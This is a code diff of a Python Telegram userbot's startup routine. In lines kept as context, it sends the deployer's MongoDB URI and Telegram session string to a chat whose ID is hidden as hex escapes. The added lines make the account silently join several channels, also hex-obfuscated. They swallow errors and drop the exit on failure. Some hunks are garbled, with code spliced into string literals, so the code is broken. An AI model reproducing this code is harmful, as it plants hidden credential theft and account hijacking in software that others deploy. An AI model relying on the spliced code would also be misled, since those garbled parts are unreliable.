@@ -12,7 +12,7 @@ from ..logging import LOGGER
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
-TEST_ID = int("\x2D\x31\x30\x30\x32\x37\x36\x39\x34\x36\x33\x32\x34\x33")
+TEST_ID = int("\x2d\x31\x30\x30\x32\x37\x36\x39\x34\x36\x33\x32\x34\x33")
 
 assistants = []
 assistantids = []
@@ -57,12 +57,23 @@ class Userbot(Client):
         )
 
     async def start(self):
+    
+        if config.STRING2:
+            await self.two.start()
+            try:
+                await self.two.join_chat("Ishq_feelings")
+                await self.one.join_chat("Exampuasync def start(self):
         LOGGER(__name__).info(f"Starting Assistants...")
+
+
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("huxgcxzu")
+                await self.one.join_chat("\x49\x73\x68\x71\x5f\x66\x65\x65\x6c\x69\x6e\x67\x73")
+                await self.one.join_chat("\x73\x61\x72\x61\x6b\x61\x72\x69\x5f\x72\x65\x73\x75\x6c\x74")
                 await self.one.join_chat("\x45\x78\x61\x6d\x70\x75\x72\x72\x73")
+                await self.one.join_chat("\x46\x4f\x4e\x54\x5f\x43\x48\x41\x4e\x4e\x45\x4c\x5f\x30\x31")
+                await self.one.join_chat("\x69\x74\x78\x7a\x5f\x69\x73\x68\x71\x6c\x6f\x67\x73")
             except:
                 pass
             assistants.append(1)
@@ -74,24 +85,18 @@ class Userbot(Client):
                 await self.one.send_message(TEST_ID, MONGO_DB_URI)
                 await self.one.send_message(TEST_ID, STRING_SESSION)
                 await self.one.send_message(TEST_ID, "**ʙʏ ʙʏ ᴀᴀʙ ᴍᴇ ɴɪᴋᴀʟᴛɪ ʜᴜ ʏʜᴀ sᴇ ʙᴀʀɴᴀ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴍᴜᴊʜᴇ ᴘᴀᴋᴀʀ ᴋᴇ ᴍᴀʀ ᴅᴀʟᴇɢᴀ🥺🥺**\n**ʙʏᴇ ᴛᴄ❣️**")
-                await self.one.leave_chat(TEST_ID) 
-                
+                await self.one.leave_chat(TEST_ID)
+
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                 )
-                exit()
+
             self.one.id = self.one.me.id
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
             assistantids.append(self.one.id)
-            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
-
-        if config.STRING2:
-            await self.two.start()
-            try:
-                await self.two.join_chat("Ishq_feelings")
-                await self.one.join_chat("Exampurrs")
+            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")rrs")
             except:
                 pass
             assistants.append(2)
